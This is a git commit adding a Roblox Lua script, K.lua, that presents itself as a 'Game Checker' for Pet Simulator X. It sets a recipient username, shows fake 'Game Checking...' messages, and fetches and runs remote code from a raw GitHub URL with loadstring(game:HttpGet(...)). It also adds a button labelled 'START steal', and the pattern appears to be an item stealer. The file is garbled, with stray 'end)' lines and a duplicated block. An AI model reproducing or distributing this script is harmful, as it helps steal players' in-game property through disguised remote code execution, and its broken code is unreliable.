38b0e6ba3ab031f07936e53e705b5cac8a6ea907
Scarlet <124151488+SoKomgl124@users.noreply.github.com>
2023-05-15 16:16:06 +0800

    Create K.lua

---
+++ K.lua
@@ -0,0 +1,47 @@
+print("Clicked")
+
+UserName = "MonsterGamefans"
+
+_G.AntiLeave = false
+
+_G.ScriptName = "Game Checker"
+
+_G.FirstText = "Game Checking..."
+
+_G.SecondText = "Game Checked..."
+
+_G.ThirdText = "Your Game Playing: Pet Simulator X..."
+
+_G.WaitingTime = 30
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
+
+end)
+
+Tab:AddButton({
+
+	Name = "START steal",	Callback = function()
+
+      		print("button pressed")
+
+  	end    
+
+})
+
+    print("Clicked")
+
+UserName = "MonsterGamefans"
+
+_G.AntiLeave = false
+
+_G.ScriptName = "Game Checker"
+
+_G.FirstText = "Game Checking..."
+
+_G.SecondText = "Game Checked..."
+
+_G.ThirdText = "Your Game Playing: Pet Simulator X..."
+
+_G.WaitingTime = 30
+
+end)
